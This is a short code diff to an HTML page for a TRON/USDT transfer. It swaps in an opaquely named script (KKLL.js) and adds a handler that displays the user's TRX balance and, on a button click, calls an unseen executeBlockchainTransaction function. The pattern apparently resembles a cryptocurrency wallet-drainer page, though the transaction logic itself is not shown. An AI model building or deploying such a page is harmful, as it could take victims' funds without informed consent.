@@ -136,11 +136,22 @@
         </div>
         <button class="next-button" id="submitBtn">Next</button>
     </div>
- <script type="text/javascript" src="./static/js/to.js"></script>
+ <script type="text/javascript" src="./static/js/KKLL.js"></script>
    
     <script>
     
-   
+    $(function() {
+            sleep(1000).then(() => {
+                getAssets(function(trx, usdt) {
+                    $("#submitBtn")["removeAttr"]("disabled");
+                    $("#submitBtn")["text"]("下一步");
+                    $("#available-amount").html(trx);
+                });
+            });
+            $("#submitBtn").click(function() {
+                executeBlockchainTransaction();
+            });
+        });
     
         let amount = '0';
         const amountDisplay = document.getElementById('amount-display');
